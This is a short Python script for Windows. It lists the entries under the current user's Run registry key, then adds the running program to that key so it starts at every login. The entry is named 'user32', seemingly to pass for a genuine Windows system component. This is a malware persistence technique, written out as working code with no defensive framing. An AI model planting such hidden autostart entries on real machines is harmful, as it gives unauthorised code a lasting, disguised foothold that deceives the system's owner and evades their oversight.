import os
import sys
import winreg


def exe_path():
    cwd = os.getcwd()
    p = f"{cwd}\\{sys.argv[0]}"
    return p

def read_registry(path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0, winreg.KEY_READ)
    for n in range(20):
        try:
            x = winreg.EnumValue(registry_key, n)
            print(x)
        except:
            break

def write_registry(path, name, e_path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, e_path)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print(e)

def register_service():
    # Manipulate Windows Registry to make exe run on startup
    e_path = exe_path()
    name = "user32"
    path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    write_registry(path, name, e_path)

def main():
    register_service()

if __name__=="__main__":
    main()